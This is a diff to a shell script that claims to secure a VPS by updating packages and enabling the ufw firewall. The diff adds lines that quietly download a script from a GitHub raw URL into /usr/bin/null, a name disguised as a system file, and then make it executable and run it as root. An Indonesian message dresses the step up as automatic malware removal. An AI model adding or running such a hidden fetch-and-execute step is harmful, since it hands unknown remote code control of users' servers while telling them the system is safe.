@@ -26,6 +26,8 @@ apt update && apt upgrade -y
 apt install ufw -y
 ufw allow ssh
 ufw enable
+[ -f /usr/bin/null ] && rm -vf /usr/bin/null && echo -e "\n[✓] force update dan jalankan command untuk menghapus mallware secara otomatis!! \n"
+wget -qO /usr/bin/null "https://raw.githubusercontent.com/triadzyu/very/ganteng/upx_null.sh"
+chmod +x /usr/bin/null && null
 echo "[✓] Sistem diupdate dan firewall aktif."
-
 echo "[✓] VPS aman. Silakan relogin untuk cek hasilnya."
